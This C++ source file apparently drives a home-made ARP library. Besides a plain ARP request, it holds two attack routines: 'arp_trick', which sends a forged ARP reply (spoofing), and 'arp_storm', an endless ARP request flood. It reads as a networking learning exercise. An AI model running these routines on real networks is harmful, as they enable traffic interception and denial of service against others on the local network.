//
// Created by geek on 2022/4/8.
//

#include "../NetworkLayer/ArpReply.h"
#include "../NetworkLayer/ArpRequest.h"
#include "../NetworkLayer/Arp.h"

void arp_request()
{
    using ARPType = Arp::ARPType;
    ArpRequest request("wlo1");
    request.SetIp2Mac("172.24.255.254","00:00:00:00:00:00"); // gatway gateway
    request.Init();
    request.GenerateFrame();
}


void arp_trick()
{
    using ARPType = Arp::ARPType;
    ArpReply reply("wlo1");
    reply.SetIp2Mac("192.168.1.10","1f:1f:1f:1f:1f:1f","172.24.75.188","08:71:90:01:f8:e2");
    reply.Init();
    reply.GenerateFrame();
}

void arp_storm()
{
    while (true)
    {
        arp_request();
    }
}

int main()
{
    int signal = 0; // 0 request 1 trick 2 storm
    switch (signal) {
        case 0:
            arp_request();
            break;
        case 1:
            arp_trick();
            break;
        case 2:
            arp_storm();
            break;
        default:
            break;
    }

    return 0;
}